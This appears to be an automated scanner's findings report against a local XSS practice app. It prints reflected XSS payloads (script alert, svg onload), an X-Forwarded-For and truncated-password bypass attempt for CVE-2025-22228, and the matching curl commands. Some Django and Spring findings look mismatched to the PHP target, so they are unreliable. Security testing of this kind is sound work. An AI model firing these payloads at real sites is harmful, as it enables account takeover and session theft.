findings.title: Spring Security BCrypt Truncation & ACL Bypass Detection
findings.description:
Registers a user, logs in, and attempts to access the /admin/search endpoint 
using a truncated password (CVE-2025-22228) and X-Forwarded-For header.
findings.request:
POST /www/XSS/XSS_level2.php/admin/search HTTP/1.1
Host: localhost:9991
User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; rv:100.0esr) Gecko/20012409 Firefox/100.0esr
Connection: close
Content-Length: 107
Content-Type: application/json
X-Forwarded-For: 127.0.0.1
Accept-Encoding: gzip

{"apiKey": "test", "password": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaB"}
findings.response:
HTTP/1.1 200 OK Connection: close Content-Length: 624 Content-Type: text/html; charset=UTF-8 Date: Tue, 30 Dec 2025 13:41:55 GMT Server: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3 X-Powered-By: PHP/5.6.21 XSS 2

Your name:
findings.curlCommand: curl -X 'POST' -d '{"apiKey": "test", "password": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaB"}' -H 'Content-Type: application/json' -H 'Host: localhost:9991' -H 'User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; rv:100.0esr) Gecko/20012409 Firefox/100.0esr' -H 'X-Forwarded-For: 127.0.0.1' 'http://localhost:9991/www/XSS/XSS_level2.php/admin/search'

findings.title: Comprehensive XSS Detection (All Vectors)
findings.description: Comprehensive XSS template combining multiple bypass techniques, polyglots, WAF bypasses, and advanced payloads
findings.request:
GET /www/XSS/XSS_level2.php?q=<script>alert({{1}})</script> HTTP/1.1
Host: localhost:9991
User-Agent: Mozilla/5.0 (ZZ; Linux i686; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
findings.response:
HTTP/1.1 200 OK Connection: close Content-Length: 624 Content-Type: text/html; charset=UTF-8 Date: Tue, 30 Dec 2025 13:41:00 GMT Server: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3 X-Powered-By: PHP/5.6.21 XSS 2

Your name:
findings.curlCommand: curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (ZZ; Linux i686; rv:125.0) Gecko/20100101 Firefox/125.0' 'http://localhost:9991/www/XSS/XSS_level2.php?q=<script>alert({{1}})</script>'

findings.title: Fuzzing Parameters - Cross-Site Scripting
findings.description: Cross-site scripting was discovered via a search for reflected parameter values in the server response via GET-requests.
findings.request:
GET /www/XSS/XSS_level2.php/?location=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-location%27%29%3E&link_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_url%27%29%3E&post_mime_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-post_mime_type%27%29%3E&uid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-uid%27%29%3E&host=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-host%27%29%3E&cmd=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-cmd%27%29%3E&link_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-link_id%27%29%3E&reset=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-reset%27%29%3E&nonce=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-nonce%27%29%3E&username=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-username%27%29%3E&site=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-site%27%29%3E&do=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-do%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-email%27%29%3E HTTP/1.1
Host: localhost:9991
User-Agent: Mozilla/5.0 (Kubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
findings.response:
HTTP/1.1 200 OK Connection: close Content-Length: 676 Content-Type: text/html; charset=UTF-8 Date: Tue, 30 Dec 2025 13:41:01 GMT Server: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3 X-Powered-By: PHP/5.6.21 XSS 2

findings.description: CSP is not set for URL: http://localhost:9991/www/XSS/XSS_level2.php

findings.description: X-Frame-Options is not set

findings.title: Unencrypted Channels
findings.description: No HTTPS redirection for this host. All HTTP requests are served in clear text.

findings.title: Unencrypted Channels
findings.description: Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://localhost:9991/www/XSS/XSS_level2.php?username=alice&submit=Submit. The server did not enforce HTTPS.

findings.title: Django Debug Page - Cross-Site Scripting
findings.description: Django 1.10.x before 1.10.8 and 1.11.x before 1.11.5 has HTML autoescaping disabled in a portion of the template for the technical 500 debug page. We detected that right circumstances (DEBUG=True) are present to allow a cross-site scripting attack.
findings.impact: Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the context of the victim's browser, leading to potential session hijacking, defacement, or theft of sensitive information.
findings.request:
GET /www/XSS/XSS_level1.php/create_user/?username=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1
Host: localhost:9991
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
findings.response:
HTTP/1.1 200 OK Connection: close Content-Length: 674 Content-Type: text/html; charset=UTF-8 Date: Tue, 30 Dec 2025 13:39:36 GMT Server: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3 X-Powered-By: PHP/5.6.21 XSS 1

Your name:

Your name is
findings.curlCommand: curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15' 'http://localhost:9991/www/XSS/XSS_level1.php/create_user/?username=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E'

findings.title: Spring Security BCrypt Truncation & ACL Bypass Detection
findings.description:
Registers a user, logs in, and attempts to access the /admin/search endpoint 
using a truncated password (CVE-2025-22228) and X-Forwarded-For header.
findings.request:
POST /www/XSS/XSS_level1.php/admin/search HTTP/1.1
Host: localhost:9991
User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Connection: close
Content-Length: 107
Content-Type: application/json
X-Forwarded-For: 127.0.0.1
Accept-Encoding: gzip

{"apiKey": "test", "password": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaB"}
findings.response:
HTTP/1.1 200 OK Connection: close Content-Length: 622 Content-Type: text/html; charset=UTF-8 Date: Tue, 30 Dec 2025 13:40:27 GMT Server: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3 X-Powered-By: PHP/5.6.21 XSS 1

Your name:
findings.curlCommand: curl -X 'POST' -d '{"apiKey": "test", "password": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaB"}' -H 'Content-Type: application/json' -H 'Host: localhost:9991' -H 'User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36' -H 'X-Forwarded-For: 127.0.0.1' 'http://localhost:9991/www/XSS/XSS_level1.php/admin/search'

findings.title: Django Debug Page - Cross-Site Scripting
findings.description: Django 1.10.x before 1.10.8 and 1.11.x before 1.11.5 has HTML autoescaping disabled in a portion of the template for the technical 500 debug page. We detected that right circumstances (DEBUG=True) are present to allow a cross-site scripting attack.
findings.impact: Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the context of the victim's browser, leading to potential session hijacking, defacement, or theft of sensitive information.
findings.request:
GET /www/XSS/XSS_level1.php/create_user/?username=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1
Host: localhost:9991
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/536.26.17 (KHTML, like Gecko) Version/6.0.2 Safari/536.26.17
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
findings.response:
HTTP/1.1 200 OK Connection: close Content-Length: 674 Content-Type: text/html; charset=UTF-8 Date: Tue, 30 Dec 2025 13:40:45 GMT Server: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3 X-Powered-By: PHP/5.6.21 XSS 1

Your name:

Your name is
findings.curlCommand: curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/536.26.17 (KHTML, like Gecko) Version/6.0.2 Safari/536.26.17' 'http://localhost:9991/www/XSS/XSS_level1.php/create_user/?username=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E'
